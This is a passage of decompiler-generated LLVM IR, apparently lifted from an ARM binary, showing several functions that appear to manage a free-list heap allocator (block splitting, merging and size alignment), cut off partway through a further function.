  uselistorder i32 (i32)* @function_14100, { 3, 57, 0, 5, 56, 55, 54, 53, 52, 51, 50, 49, 48, 47, 46, 45, 44, 43, 42, 41, 40, 39, 38, 37, 36, 35, 34, 33, 32, 31, 30, 29, 28, 27, 26, 25, 24, 23, 22, 21, 20, 19, 18, 17, 16, 15, 14, 13, 12, 11, 10, 9, 8, 7, 2, 1, 6, 4 }
  uselistorder i32 ()* @function_142ac, { 1, 0, 4, 3, 2, 5, 7, 6 }
  uselistorder i32* @r8, { 91, 92, 93, 94, 95, 104, 7, 8, 10, 9, 11, 12, 13, 96, 97, 102, 103, 98, 99, 100, 101, 20, 21, 22, 23, 80, 81, 82, 14, 15, 16, 17, 18, 19, 24, 25, 26, 0, 1, 2, 3, 4, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 6, 51, 52, 53, 54, 55, 56, 57, 58, 5, 59, 60, 61, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 79, 83, 84, 85, 86, 87, 88, 89, 90, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 137, 138, 139, 140, 141, 142, 146, 143, 144, 145, 147, 148, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 163, 164, 165, 166, 167, 168, 169, 171, 172, 170, 173, 174, 175, 176, 177, 178, 179 }
  uselistorder label %dec_label_pc_1449c, { 3, 1, 2, 0 }
  uselistorder label %dec_label_pc_14454, { 1, 0 }
  uselistorder label %bb14, { 1, 0 }
  uselistorder label %dec_label_pc_143c8, { 1, 0 }
}

define i32 @function_144b4(i32* %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_144b4:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %stack_var_-8 = alloca i32, align 4
  %v1_144b4 = inttoptr i32 %arg2 to i32*
  %v2_144b4 = load i32, i32* %v1_144b4, align 4
  %v3_144b8 = load i32, i32* @r4, align 4
  store i32 %v3_144b8, i32* %stack_var_-8, align 4
  %v1_144bc = add i32 %v2_144b4, 3
  %v1_144c0 = and i32 %v1_144bc, -4
  store i32 %v1_144c0, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r4.global-to-local, align 4
  %v2_144c8 = icmp ugt i32 %v1_144c0, 10
  store i32 %tmp, i32* %r1.global-to-local, align 4
  %v2_144d0 = load i32, i32* %arg1, align 4
  store i32 %v2_144d0, i32* %r0.global-to-local, align 4
  br i1 %v2_144c8, label %dec_label_pc_1453c.preheader, label %bb

bb:                                               ; preds = %dec_label_pc_144b4
  store i32 12, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1453c.preheader

dec_label_pc_1453c.preheader:                     ; preds = %dec_label_pc_144b4, %bb
  %v1_144f0 = phi i32 [ %v1_144c0, %dec_label_pc_144b4 ], [ 12, %bb ]
  %v2_1453c9 = icmp eq i32 %v2_144d0, 0
  br i1 %v2_1453c9, label %dec_label_pc_14544, label %dec_label_pc_144dc

dec_label_pc_144dc:                               ; preds = %dec_label_pc_1453c.preheader, %dec_label_pc_14538
  %v2_144f4 = phi i32 [ %v3_14538, %dec_label_pc_14538 ], [ %v2_144d0, %dec_label_pc_1453c.preheader ]
  %v1_144dc = inttoptr i32 %v2_144f4 to i32*
  %v2_144dc = load i32, i32* %v1_144dc, align 4
  store i32 %v2_144dc, i32* %ip.global-to-local, align 4
  %v3_144e0 = icmp ult i32 %v2_144dc, %v1_144f0
  br i1 %v3_144e0, label %dec_label_pc_14538, label %dec_label_pc_144e8

dec_label_pc_144e8:                               ; preds = %dec_label_pc_144dc
  %v1_144e8 = add i32 %v1_144f0, 44
  %v3_144ec = icmp ult i32 %v2_144dc, %v1_144e8
  br i1 %v3_144ec, label %dec_label_pc_144fc, label %.thread._crit_edge

.thread._crit_edge:                               ; preds = %dec_label_pc_144e8
  %v2_144e0.le = sub i32 %v2_144dc, %v1_144f0
  store i32 %v2_144e0.le, i32* %v1_144dc, align 4
  %v0_14528.pre = load i32, i32* %ip.global-to-local, align 4
  %v0_14530.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb29

dec_label_pc_144fc:                               ; preds = %dec_label_pc_144e8
  %v1_144fc = add i32 %v2_144f4, 4
  %v2_144fc = inttoptr i32 %v1_144fc to i32*
  %v3_144fc = load i32, i32* %v2_144fc, align 4
  store i32 %v3_144fc, i32* %r2.global-to-local, align 4
  %v2_14500 = icmp eq i32 %v3_144fc, 0
  br i1 %v2_14500, label %.thread2, label %bb27

bb27:                                             ; preds = %dec_label_pc_144fc
  %v2_14504 = add i32 %v2_144f4, 8
  %v3_14504 = inttoptr i32 %v2_14504 to i32*
  %v4_14504 = load i32, i32* %v3_14504, align 4
  %v3_14508 = add i32 %v3_144fc, 8
  %v4_14508 = inttoptr i32 %v3_14508 to i32*
  store i32 %v4_14504, i32* %v4_14508, align 4
  %v0_1450c.pre = load i32, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_144fc, %bb27
  %v0_1450c = phi i32 [ %v2_144f4, %dec_label_pc_144fc ], [ %v0_1450c.pre, %bb27 ]
  %v1_1450c = add i32 %v0_1450c, 8
  %v2_1450c = inttoptr i32 %v1_1450c to i32*
  %v3_1450c = load i32, i32* %v2_1450c, align 4
  %v1_14510 = add i32 %v0_1450c, 4
  %v2_14510 = inttoptr i32 %v1_14510 to i32*
  %v3_14510 = load i32, i32* %v2_14510, align 4
  %v2_14514 = icmp eq i32 %v3_1450c, 0
  br i1 %v2_14514, label %.thread5, label %bb28

bb28:                                             ; preds = %.thread2
  %v3_14518 = add i32 %v3_1450c, 4
  %v4_14518 = inttoptr i32 %v3_14518 to i32*
  store i32 %v3_14510, i32* %v4_14518, align 4
  %v1_14520 = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_14520, i32* %r2.global-to-local, align 4
  br label %bb29

.thread5:                                         ; preds = %.thread2
  %v2_1451c = load i32, i32* %r1.global-to-local, align 4
  %v3_1451c = inttoptr i32 %v2_1451c to i32*
  store i32 %v3_14510, i32* %v3_1451c, align 4
  %v1_14524.pre = load i32, i32* %ip.global-to-local, align 4
  store i32 %v1_14524.pre, i32* %r2.global-to-local, align 4
  br label %bb29

bb29:                                             ; preds = %bb28, %.thread._crit_edge, %.thread5
  %v0_14530 = phi i32 [ %v0_14530.pre, %.thread._crit_edge ], [ %v1_14520, %bb28 ], [ %v1_14524.pre, %.thread5 ]
  %v0_14528 = phi i32 [ %v0_14528.pre, %.thread._crit_edge ], [ %v1_14520, %bb28 ], [ %v1_14524.pre, %.thread5 ]
  %v1_14528 = load i32, i32* %r0.global-to-local, align 4
  %v2_14528 = sub i32 %v1_14528, %v0_14528
  %v1_1452c = add i32 %v2_14528, 12
  store i32 %v1_1452c, i32* %r0.global-to-local, align 4
  %v1_14530 = load i32, i32* %r4.global-to-local, align 4
  %v2_14530 = inttoptr i32 %v1_14530 to i32*
  store i32 %v0_14530, i32* %v2_14530, align 4
  %v2_14534 = load i32, i32* %stack_var_-8, align 4
  store i32 %v2_14534, i32* %r4.global-to-local, align 4
  ret i32 %v1_1452c

dec_label_pc_14538:                               ; preds = %dec_label_pc_144dc
  %v1_14538 = add i32 %v2_144f4, 4
  %v2_14538 = inttoptr i32 %v1_14538 to i32*
  %v3_14538 = load i32, i32* %v2_14538, align 4
  store i32 %v3_14538, i32* %r0.global-to-local, align 4
  %v2_1453c = icmp eq i32 %v3_14538, 0
  br i1 %v2_1453c, label %dec_label_pc_1453c.dec_label_pc_14544_crit_edge, label %dec_label_pc_144dc

dec_label_pc_1453c.dec_label_pc_14544_crit_edge:  ; preds = %dec_label_pc_14538
  br label %dec_label_pc_14544

dec_label_pc_14544:                               ; preds = %dec_label_pc_1453c.dec_label_pc_14544_crit_edge, %dec_label_pc_1453c.preheader
  store i32 %v3_144b8, i32* %r4.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_14538, { 1, 2, 0 }
  uselistorder i32 %v0_1450c, { 1, 0 }
  uselistorder i32 %v2_144dc, { 1, 0, 2, 3 }
  uselistorder i32 %v2_144f4, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_144f0, { 0, 2, 1 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 2, 4, 3, 5 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 4, 3, 5, 0 }
  uselistorder label %bb29, { 2, 0, 1 }
  uselistorder label %.thread2, { 1, 0 }
  uselistorder label %dec_label_pc_144dc, { 1, 0 }
  uselistorder label %dec_label_pc_1453c.preheader, { 1, 0 }
}

define i32 @function_14548(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14548:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_1454c = load i32, i32* %arg1, align 4
  store i32 %v2_1454c, i32* %ip.global-to-local, align 4
  store i32 %tmp, i32* %lr.global-to-local, align 4
  %v2_145c46 = icmp eq i32 %v2_1454c, 0
  br i1 %v2_145c46, label %dec_label_pc_145cc, label %dec_label_pc_14558

dec_label_pc_14558:                               ; preds = %dec_label_pc_14548, %dec_label_pc_145c0
  %v0_14598 = phi i32 [ %v3_145c0, %dec_label_pc_145c0 ], [ %v2_1454c, %dec_label_pc_14548 ]
  %v1_14558 = inttoptr i32 %v0_14598 to i32*
  %v2_14558 = load i32, i32* %v1_14558, align 4
  store i32 %v2_14558, i32* %r0.global-to-local, align 4
  %v2_1455c = sub i32 %v0_14598, %v2_14558
  %v1_14560 = add i32 %v2_1455c, 12
  %v3_14564 = icmp uge i32 %v1_14560, %arg2
  %v9_14564 = icmp eq i32 %v1_14560, %arg2
  %v2_14568 = xor i1 %v9_14564, true
  %v3_14568 = and i1 %v3_14564, %v2_14568
  br i1 %v3_14568, label %dec_label_pc_145c0, label %dec_label_pc_1456c

dec_label_pc_1456c:                               ; preds = %dec_label_pc_14558
  br i1 %v9_14564, label %dec_label_pc_14570, label %dec_label_pc_145cc

dec_label_pc_14570:                               ; preds = %dec_label_pc_1456c
  %v1_14570 = add i32 %arg3, 3
  %v1_14574 = and i32 %v1_14570, -4
  store i32 %v1_14574, i32* %r2.global-to-local, align 4
  %v2_14578 = sub i32 %v2_14558, %v1_14574
  %v3_14578 = icmp ult i32 %v2_14558, %v1_14574
  br i1 %v3_14578, label %dec_label_pc_145cc, label %dec_label_pc_14580

dec_label_pc_14580:                               ; preds = %dec_label_pc_14570
  %v1_14580 = add i32 %v1_14574, 44
  %v3_14584 = icmp ult i32 %v2_14558, %v1_14580
  br i1 %v3_14584, label %.thread2, label %bb

bb:                                               ; preds = %dec_label_pc_14580
  store i32 %v2_14578, i32* %v1_14558, align 4
  %v1_14590 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v1_14590, i32* %r0.global-to-local, align 4
  ret i32 %v1_14590

.thread2:                                         ; preds = %dec_label_pc_14580
  %v1_14598 = add i32 %v0_14598, 4
  %v2_14598 = inttoptr i32 %v1_14598 to i32*
  %v3_14598 = load i32, i32* %v2_14598, align 4
  store i32 %v3_14598, i32* %r2.global-to-local, align 4
  %v2_1459c = icmp eq i32 %v3_14598, 0
  br i1 %v2_1459c, label %.thread3, label %bb17

bb17:                                             ; preds = %.thread2
  %v2_145a0 = add i32 %v0_14598, 8
  %v3_145a0 = inttoptr i32 %v2_145a0 to i32*
  %v4_145a0 = load i32, i32* %v3_145a0, align 4
  %v3_145a4 = add i32 %v3_14598, 8
  %v4_145a4 = inttoptr i32 %v3_145a4 to i32*
  store i32 %v4_145a0, i32* %v4_145a4, align 4
  %v0_145a8.pre = load i32, i32* %ip.global-to-local, align 4
  br label %.thread3

.thread3:                                         ; preds = %.thread2, %bb17
  %v0_145a8 = phi i32 [ %v0_14598, %.thread2 ], [ %v0_145a8.pre, %bb17 ]
  %v1_145a8 = add i32 %v0_145a8, 8
  %v2_145a8 = inttoptr i32 %v1_145a8 to i32*
  %v3_145a8 = load i32, i32* %v2_145a8, align 4
  store i32 %v3_145a8, i32* %r2.global-to-local, align 4
  %v1_145ac = add i32 %v0_145a8, 4
  %v2_145ac = inttoptr i32 %v1_145ac to i32*
  %v3_145ac = load i32, i32* %v2_145ac, align 4
  %v2_145b0 = icmp eq i32 %v3_145a8, 0
  br i1 %v2_145b0, label %.thread4, label %bb18

bb18:                                             ; preds = %.thread3
  %v3_145b4 = add i32 %v3_145a8, 4
  %v4_145b4 = inttoptr i32 %v3_145b4 to i32*
  store i32 %v3_145ac, i32* %v4_145b4, align 4
  br label %bb19

.thread4:                                         ; preds = %.thread3
  %v2_145b8 = load i32, i32* %lr.global-to-local, align 4
  %v3_145b8 = inttoptr i32 %v2_145b8 to i32*
  store i32 %v3_145ac, i32* %v3_145b8, align 4
  br label %bb19

bb19:                                             ; preds = %bb18, %.thread4
  %v5_145bc = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v5_145bc

dec_label_pc_145c0:                               ; preds = %dec_label_pc_14558
  %v1_145c0 = add i32 %v0_14598, 4
  %v2_145c0 = inttoptr i32 %v1_145c0 to i32*
  %v3_145c0 = load i32, i32* %v2_145c0, align 4
  store i32 %v3_145c0, i32* %ip.global-to-local, align 4
  %v2_145c4 = icmp eq i32 %v3_145c0, 0
  br i1 %v2_145c4, label %dec_label_pc_145c4.dec_label_pc_145cc.loopexit_crit_edge, label %dec_label_pc_14558

dec_label_pc_145c4.dec_label_pc_145cc.loopexit_crit_edge: ; preds = %dec_label_pc_145c0
  br label %dec_label_pc_145cc

dec_label_pc_145cc:                               ; preds = %dec_label_pc_14570, %dec_label_pc_14548, %dec_label_pc_145c4.dec_label_pc_145cc.loopexit_crit_edge, %dec_label_pc_1456c
  store i32 0, i32* %r0.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v3_145c0, { 1, 2, 0 }
  uselistorder i32 %v0_145a8, { 1, 0 }
  uselistorder i32 %v1_14574, { 0, 2, 1, 3 }
  uselistorder i1 %v9_14564, { 1, 0 }
  uselistorder i32 %v2_14558, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v0_14598, { 3, 2, 1, 0, 5, 4 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r0.global-to-local, { 1, 3, 2, 4, 0 }
  uselistorder label %dec_label_pc_145cc, { 2, 0, 3, 1 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread3, { 1, 0 }
  uselistorder label %dec_label_pc_14558, { 1, 0 }
}

define i32 @function_145d4() local_unnamed_addr {
dec_label_pc_145d4:
  %v0_145d4 = load i32, i32* @r2, align 4
  %v2_145d4 = icmp eq i32 %v0_145d4, 0
  %v0_145d8 = load i32, i32* @r3, align 4
  %v1_145d8 = load i32, i32* @r1, align 4
  %v2_145d8 = add i32 %v1_145d8, 4
  %v3_145d8 = inttoptr i32 %v2_145d8 to i32*
  store i32 %v0_145d8, i32* %v3_145d8, align 4
  %v0_145dc = load i32, i32* @r2, align 4
  %v1_145dc = load i32, i32* @r1, align 4
  %v2_145dc = add i32 %v1_145dc, 8
  %v3_145dc = inttoptr i32 %v2_145dc to i32*
  store i32 %v0_145dc, i32* %v3_145dc, align 4
  %v1_145e4 = load i32, i32* @r1, align 4
  br i1 %v2_145d4, label %.thread, label %bb

bb:                                               ; preds = %dec_label_pc_145d4
  %v2_145e0 = load i32, i32* @r2, align 4
  %v3_145e0 = add i32 %v2_145e0, 4
  %v4_145e0 = inttoptr i32 %v3_145e0 to i32*
  store i32 %v1_145e4, i32* %v4_145e0, align 4
  br label %bb1

.thread:                                          ; preds = %dec_label_pc_145d4
  %v2_145e4 = load i32, i32* @r0, align 4
  %v3_145e4 = inttoptr i32 %v2_145e4 to i32*
  store i32 %v1_145e4, i32* %v3_145e4, align 4
  br label %bb1

bb1:                                              ; preds = %bb, %.thread
  %v0_145e8 = load i32, i32* @r3, align 4
  %v2_145e8 = icmp eq i32 %v0_145e8, 0
  br i1 %v2_145e8, label %bb3, label %bb2

bb2:                                              ; preds = %bb1
  %v1_145ec = load i32, i32* @r1, align 4
  %v3_145ec = add i32 %v0_145e8, 8
  %v4_145ec = inttoptr i32 %v3_145ec to i32*
  store i32 %v1_145ec, i32* %v4_145ec, align 4
  br label %bb3

bb3:                                              ; preds = %bb1, %bb2
  %v1_145f0 = load i32, i32* @r0, align 4
  ret i32 %v1_145f0

; uselistorder directives
  uselistorder i32 %v1_145e4, { 1, 0 }
  uselistorder label %bb3, { 1, 0 }
  uselistorder label %bb1, { 1, 0 }
}

define i32 @function_145f4() local_unnamed_addr {
dec_label_pc_145f4:
  %v0_145f4 = load i32, i32* @r2, align 4
  %v2_145f4 = icmp eq i32 %v0_145f4, 0
  %v1_145f8 = load i32, i32* @r1, align 4
  br i1 %v2_145f4, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_145f4
  %v2_145f8 = load i32, i32* @r0, align 4
  %v3_145f8 = inttoptr i32 %v2_145f8 to i32*
  store i32 %v1_145f8, i32* %v3_145f8, align 4
  br label %bb2

.thread:                                          ; preds = %dec_label_pc_145f4
  %v3_145fc = add i32 %v0_145f4, 4
  %v4_145fc = inttoptr i32 %v3_145fc to i32*
  store i32 %v1_145f8, i32* %v4_145fc, align 4
  br label %bb2

bb2:                                              ; preds = %bb, %.thread
  %v0_14600 = load i32, i32* @r2, align 4
  %v1_14600 = load i32, i32* @r1, align 4
  %v2_14600 = add i32 %v1_14600, 8
  %v3_14600 = inttoptr i32 %v2_14600 to i32*
  store i32 %v0_14600, i32* %v3_14600, align 4
  %v1_14604 = load i32, i32* @r0, align 4
  ret i32 %v1_14604

; uselistorder directives
  uselistorder label %bb2, { 1, 0 }
}

define i32 @function_14608(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_14608:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* @r0, align 4
  %stack_var_-20 = alloca i32, align 4
  %v3_14608 = load i32, i32* @r4, align 4
  store i32 %v3_14608, i32* %stack_var_-20, align 4
  %v2_1460c = load i32, i32* %arg1, align 4
  store i32 %v2_1460c, i32* %r4.global-to-local, align 4
  %v2_14610 = add i32 %arg3, %arg2
  store i32 0, i32* %r6.global-to-local, align 4
  %v2_1462c2 = icmp eq i32 %v2_1460c, 0
  br i1 %v2_1462c2, label %dec_label_pc_146dc, label %dec_label_pc_1461c

dec_label_pc_1461c:                               ; preds = %dec_label_pc_14608, %dec_label_pc_14624
  %v0_1466c = phi i32 [ %v0_14674, %dec_label_pc_14624 ], [ 0, %dec_label_pc_14608 ]
  %v0_14674 = phi i32 [ %v3_14628, %dec_label_pc_14624 ], [ %v2_1460c, %dec_label_pc_14608 ]
  %v1_146305.in = phi i32 [ %v3_14628, %dec_label_pc_14624 ], [ %v2_1460c, %dec_label_pc_14608 ]
  %v1_146305 = add i32 %v1_146305.in, 12
  %v3_1461c = icmp ult i32 %v1_146305, %arg2
  br i1 %v3_1461c, label %dec_label_pc_14624, label %dec_label_pc_1463c

dec_label_pc_14624:                               ; preds = %dec_label_pc_1461c
  store i32 %v0_14674, i32* %r6.global-to-local, align 4
  %v1_14628 = add i32 %v0_14674, 4
  %v2_14628 = inttoptr i32 %v1_14628 to i32*
  %v3_14628 = load i32, i32* %v2_14628, align 4
  store i32 %v3_14628, i32* %r4.global-to-local, align 4
  %v2_1462c = icmp eq i32 %v3_14628, 0
  br i1 %v2_1462c, label %dec_label_pc_1462c.dec_label_pc_146dc.loopexit_crit_edge, label %dec_label_pc_1461c

dec_label_pc_1463c:                               ; preds = %dec_label_pc_1461c
  %v1_1463c = inttoptr i32 %v0_14674 to i32*
  %v2_1463c = load i32, i32* %v1_1463c, align 4
  %v2_14640 = sub i32 %v0_14674, %v2_1463c
  %v1_14644 = add i32 %v2_14640, 12
  %v3_14648 = icmp uge i32 %v1_14644, %v2_14610
  %v9_14648 = icmp eq i32 %v1_14644, %v2_14610
  %v2_1464c = xor i1 %v9_14648, true
  %v3_1464c = and i1 %v3_14648, %v2_1464c
  br i1 %v3_1464c, label %dec_label_pc_146dc, label %dec_label_pc_14650

dec_label_pc_14650:                               ; preds = %dec_label_pc_1463c
  %v2_14650 = add i32 %v2_1463c, %arg3
  store i32 %v2_14650, i32* %r7.global-to-local, align 4
  br i1 %v9_14648, label %dec_label_pc_14658, label %dec_label_pc_14684

dec_label_pc_14658:                               ; preds = %dec_label_pc_14650
  %v2_14658 = icmp eq i32 %v0_1466c, 0
  br i1 %v2_14658, label %dec_label_pc_146d0, label %dec_label_pc_14660

dec_label_pc_14660:                               ; preds = %dec_label_pc_14658
  %v1_14660 = add i32 %v0_1466c, 12
  %v9_14664 = icmp eq i32 %v1_14660, %arg2
  br i1 %v9_14664, label %dec_label_pc_1466c, label %dec_label_pc_146d0

dec_label_pc_1466c:                               ; preds = %dec_label_pc_14660
  %v1_1466c = inttoptr i32 %v0_1466c to i32*
  %v2_1466c = load i32, i32* %v1_1466c, align 4
  %v1_14670 = add i32 %v0_1466c, 8
  %v2_14670 = inttoptr i32 %v1_14670 to i32*
  %v3_14670 = load i32, i32* %v2_14670, align 4
  store i32 %v3_14670, i32* @r2, align 4
  store i32 %v0_14674, i32* @r1, align 4
  %v2_14678 = add i32 %v2_1466c, %v2_14650
  store i32 %v2_14678, i32* %r7.global-to-local, align 4
  %v0_1467c = call i32 @function_145f4()
  br label %dec_label_pc_146d0

dec_label_pc_14684:                               ; preds = %dec_label_pc_14650
  %v1_14684 = add i32 %v0_14674, 4
  %v2_14684 = inttoptr i32 %v1_14684 to i32*
  %v3_14684 = load i32, i32* %v2_14684, align 4
  store i32 %v3_14684, i32* %r5.global-to-local, align 4
  %v2_14688 = icmp eq i32 %v3_14684, 0
  br i1 %v2_14688, label %dec_label_pc_146bc, label %dec_label_pc_14690

dec_label_pc_14690:                               ; preds = %dec_label_pc_14684
  %v1_14690 = inttoptr i32 %v3_14684 to i32*
  %v2_14690 = load i32, i32* %v1_14690, align 4
  %v2_14694 = sub i32 %v3_14684, %v2_14690
  %v1_14698 = add i32 %v2_14694, 12
  %v9_1469c = icmp eq i32 %v2_14610, %v1_14698
  br i1 %v9_1469c, label %dec_label_pc_146a4, label %dec_label_pc_146bc

dec_label_pc_146a4:                               ; preds = %dec_label_pc_14690
  store i32 %v0_1466c, i32* @r2, align 4
  store i32 %v3_14684, i32* @r1, align 4
  %v2_146ac = add i32 %v2_14690, %v2_14650
  store i32 %v2_146ac, i32* %r7.global-to-local, align 4
  %v0_146b0 = call i32 @function_145f4()
  %v0_146b4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_146b4, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_146d0

dec_label_pc_146bc:                               ; preds = %dec_label_pc_14690, %dec_label_pc_14684
  %v2_146bc = add i32 %v0_14674, %arg3
  store i32 %v2_146bc, i32* %r4.global-to-local, align 4
  store i32 %v3_14684, i32* @r3, align 4
  store i32 %v0_1466c, i32* @r2, align 4
  store i32 %v2_146bc, i32* @r1, align 4
  %v0_146cc = call i32 @function_145d4()
  br label %dec_label_pc_146d0

dec_label_pc_146d0:                               ; preds = %dec_label_pc_14660, %dec_label_pc_14658, %dec_label_pc_146a4, %dec_label_pc_1466c, %dec_label_pc_146bc
  %v0_146d0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_146d0, i32* %r5.global-to-local, align 4
  %v0_146d4 = load i32, i32* %r7.global-to-local, align 4
  %v2_146d4 = inttoptr i32 %v0_146d0 to i32*
  store i32 %v0_146d4, i32* %v2_146d4, align 4
  br label %dec_label_pc_146f4

dec_label_pc_1462c.dec_label_pc_146dc.loopexit_crit_edge: ; preds = %dec_label_pc_14624
  br label %dec_label_pc_146dc

dec_label_pc_146dc:                               ; preds = %dec_label_pc_14608, %dec_label_pc_1462c.dec_label_pc_146dc.loopexit_crit_edge, %dec_label_pc_1463c
  %v1_146dc = add i32 %v2_14610, -12
  store i32 %v1_146dc, i32* %r5.global-to-local, align 4
  %v3_146e0 = inttoptr i32 %v1_146dc to i32*
  store i32 %arg3, i32* %v3_146e0, align 4
  %v0_146e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_146e4, i32* @r3, align 4
  %v0_146e8 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_146e8, i32* @r2, align 4
  %v0_146ec = load i32, i32* %r5.global-to-local, align 4
  store i32 %v0_146ec, i32* @r1, align 4
  %v0_146f0 = call i32 @function_145d4()
  br label %dec_label_pc_146f4

dec_label_pc_146f4:                               ; preds = %dec_label_pc_146d0, %dec_label_pc_146dc
  %v0_146f4 = load i32, i32* %r5.global-to-local, align 4
  %v2_146f8 = load i32, i32* %stack_var_-20, align 4
  store i32 %v2_146f8, i32* @r4, align 4
  ret i32 %v0_146f4

; uselistorder directives
  uselistorder i32 %v3_14684, { 0, 1, 3, 2, 4, 5 }
  uselistorder i1 %v9_14648, { 1, 0 }
  uselistorder i32 %v3_14628, { 2, 3, 1, 0 }
  uselistorder i32 %v0_14674, { 0, 2, 1, 3, 4, 6, 7, 5 }
  uselistorder i32 %v0_1466c, { 4, 5, 1, 0, 2, 3 }
  uselistorder i32* %r7.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1, 3, 4, 5 }
  uselistorder i32* %r4.global-to-local, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 ()* @function_145d4, { 1, 0 }
  uselistorder i32* @r3, { 0, 3, 1, 2, 4 }
  uselistorder i32 ()* @function_145f4, { 1, 0 }
  uselistorder i32 %arg3, { 3, 0, 1, 2 }
  uselistorder i32 %arg2, { 1, 2, 0 }
  uselistorder label %dec_label_pc_146f4, { 1, 0 }
  uselistorder label %dec_label_pc_146dc, { 1, 2, 0 }
  uselistorder label %dec_label_pc_146d0, { 4, 2, 3, 0, 1 }
  uselistorder label %dec_label_pc_1461c, { 1, 0 }
}

define i32 @function_146fc() local_unnamed_addr {
dec_label_pc_14718.lr.ph:
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %stack_var_-128 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %stack_var_-268 = alloca i32, align 4
  %v2_146fc = ptrtoint i32* %stack_var_-268 to i32
  %v1_1470c = call i32 @function_14c94()
  store i32 31, i32* %r1.global-to-local, align 4
  %v2_14718 = ptrtoint i32* %stack_var_0 to i32
  br label %dec_label_pc_14718

dec_label_pc_14718:                               ; preds = %dec_label_pc_14718.lr.ph, %dec_label_pc_14718
  %v1_1471c = phi i32 [ 31, %dec_label_pc_14718.lr.ph ], [ %v1_14728, %dec_label_pc_14718 ]
  %v4_1471c = mul i32 %v1_1471c, 4
  %v5_1471c = add i32 %v4_1471c, %v2_14718
  %v2_14724 = add i32 %v5_1471c, -128
  %v3_14724 = inttoptr i32 %v2_14724 to i32*
  store i32 0, i32* %v3_14724, align 4
  %v0_14728 = load i32, i32* %r1.global-to-local, align 4
  %v1_14728 = add i32 %v0_14728, -1
  store i32 %v1_14728, i32* %r1.global-to-local, align 4
  %v6_14728 = icmp slt i32 %v1_14728, 0
  br i1 %v6_14728, label %dec_label_pc_14730, label %dec_label_pc_14718

dec_label_pc_14730:                               ; preds = %dec_label_pc_14718
  %v2_14730 = ptrtoint i32* %stack_var_-128 to i32
  store i32 %v2_14730, i32* @r4, align 4
  store i32 %v2_14730, i32* @r0, align 4
  store i32 6, i32* @r1, align 4
  %v0_1473c = call i32 @function_140b8()
  %v2_14740 = icmp eq i32 %v0_1473c, 0
  br i1 %v2_14740, label %bb, label %.thread1

bb:                                               ; preds = %dec_label_pc_14730
  store i32 %v2_14730, i32* %r1.global-to-local, align 4
  br label %.thread1

.thread1:                                         ; preds = %dec_label_pc_14730, %bb
  store i32 83796, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v2_14740, i32 ptrtoint (i32* @global_var_138d0.639 to i32))
  %v2_14758 = load i32, i32* @global_var_1ec50.641, align 4
  %v2_1475c = icmp eq i32 %v2_14758, 0
  br i1 %v2_1475c, label %dec_label_pc_14764, label %dec_label_pc_14794

dec_label_pc_14764:                               ; preds = %.thread1
  store i32 1, i32* @global_var_1ec50.641, align 4
  br label %dec_label_pc_1476c

dec_label_pc_1476c:                               ; preds = %dec_label_pc_147e4, %dec_label_pc_14764
  %v1_14778 = call i32 @function_14c94()
  %v1_14780 = call i32 @function_13f7c(i32 6)
  store i32 83860, i32* @lr, align 4
  %v1_14790 = call i32 @function_14c94()
  %v2_14798.pre = load i32, i32* @global_var_1ec50.641, align 4
  br label %dec_label_pc_14794

dec_label_pc_14794:                               ; preds = %.thread1, %dec_label_pc_1476c
